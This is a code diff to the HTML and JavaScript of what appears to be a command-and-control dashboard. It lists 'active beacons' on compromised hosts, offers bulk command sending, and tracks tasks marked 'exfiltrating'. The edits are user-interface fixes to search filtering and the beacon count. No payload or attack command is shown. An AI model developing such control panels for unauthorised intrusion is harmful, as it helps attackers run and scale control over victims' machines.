@@ -109,7 +109,14 @@
                 <h2 class="section-title">Active Beacons</h2>
                 <button class="btn-refresh" onclick="loadBeacons()">↻ Refresh</button>
             </div>
-            <div id="beaconsTable">
+            <input type="text" id="beaconSearch" placeholder="Filter by hostname, IP, user, OS..." aria-label="Filter beacons" style="width: 100%; padding: 10px 14px; margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,51,51,0.2); border-left: 3px solid rgba(255,51,51,0.4); color: #e0e0e0; font-size: 14px; border-radius: 0;">
+            <div id="bulkActionBar" class="bulk-action-bar">
+                    <span class="selected-count">0 selected</span>
+                    <button class="btn-bulk" onclick="bulkSendCommand()">Send Command</button>
+                    <button class="btn-bulk btn-danger" onclick="bulkDeleteBeacons()">Delete Selected</button>
+                    <button class="btn-bulk btn-secondary" onclick="clearBulkSelection()">Clear Bulk Selection</button>
+                </div>
+                            <div id="beaconsTable" style="overflow-x: auto;">
                 <div class="empty-state">
                     <div class="empty-state-icon" id="beaconsEmptyIcon"></div>
                     <div>No active beacons</div>
@@ -203,25 +210,17 @@
                     </span>
                 </div>` : '';
 
-            document.getElementById('beaconCount').textContent = allBeacons.length;
 
             if (beacons.length === 0) {
                 document.getElementById('beaconsTable').innerHTML = `
                     <div class="empty-state">
                         <div class="empty-state-icon">${icons.listDashes}</div>
-                        <div>No active beacons</div>
+                        <div>${(document.getElementById('beaconSearch') || {}).value ? 'No beacons match this filter' : 'No active beacons'}</div>
                     </div>`;
                 return;
             }
 
             const table = `
-                <input type="text" id="beaconSearch" placeholder="Filter by hostname, IP, user, OS..." style="width: 100%; padding: 10px 14px; margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,51,51,0.2); border-left: 3px solid rgba(255,51,51,0.4); color: #e0e0e0; font-size: 14px; border-radius: 0;">
-                <div id="bulkActionBar" class="bulk-action-bar">
-                    <span class="selected-count">0 selected</span>
-                    <button class="btn-bulk" onclick="bulkSendCommand()">Send Command</button>
-                    <button class="btn-bulk btn-danger" onclick="bulkDeleteBeacons()">Delete Selected</button>
-                    <button class="btn-bulk btn-secondary" onclick="clearBulkSelection()">Clear Selection</button>
-                </div>
                 <table class="table" id="beaconsTableEl">
                     <thead>
                         <tr>
@@ -288,15 +287,10 @@
                         (b.os || '').toLowerCase().includes(query) ||
                         (b.id || '').toLowerCase().includes(query)
                     );
-                    // Re-render table body only, keep search value
-                    const savedQuery = searchInput.value;
+                    // The search input lives outside the rendered container, so a
+                    // re-render (including an empty result set) cannot destroy it.
                     beaconPage = 1;
                     renderBeaconsTable(filtered);
-                    const newInput = document.getElementById('beaconSearch');
-                    if (newInput) {
-                        newInput.value = savedQuery;
-                        newInput.focus();
-                    }
                 }, 300));
             }
 
@@ -405,6 +399,11 @@
                 
                 const stats = await response.json();
                 
+                // The card is labelled ACTIVE BEACONS: report the active count, not
+                // the total including beacons that have been offline for days.
+                const activeBeacons = (stats.active_beacons !== undefined) ? stats.active_beacons : stats.beacons;
+                document.getElementById('beaconCount').textContent = activeBeacons;
+
                 const tasksByStatus = stats.tasks_by_status || {};
                 const pendingTasks = (tasksByStatus['pending'] || 0) + (tasksByStatus['sent'] || 0) + (tasksByStatus['exfiltrating'] || 0);
                 document.getElementById('taskCount').textContent = pendingTasks;
